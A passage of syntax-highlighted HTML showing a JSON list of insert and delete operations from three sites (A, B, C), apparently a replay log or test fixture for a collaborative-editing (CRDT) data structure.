</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 23
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:15&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:35&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;R&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 35
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:42&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 42
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:12&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:23&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:17&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:51&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 51
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:55&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:12&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 55
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:38&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:33&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:30&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;←&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 30
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 9
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;R&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 4
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:51&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;U&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 51
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:21&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;a&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 21
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:29&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;s&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 29
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;S&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 9
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:37&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:33&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;b&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 33
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:50&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:50&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 50
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;G&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 4
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:16&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:52&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;/&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 52
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:14&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:27&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:40&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;J&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 40
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:23&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;❌&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 23
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:15&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 15
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:44&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:26&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:43&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:39&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;y&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 39
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:21&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:25&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;f&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 25
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:21&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;n&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 21
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:17&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:35&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;R&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 35
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:46&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:34&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:19&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;S&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 11
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;HEAD&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;S&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 1
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 2
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 6
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  </span><span class="s2">{
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;S&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 9
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:24&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;HEAD&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;H&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 24
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:39&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:25&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 25
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:14&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 14
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:37&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:36&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:28&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:50&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;n&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 50
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:24&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 24
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:51&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
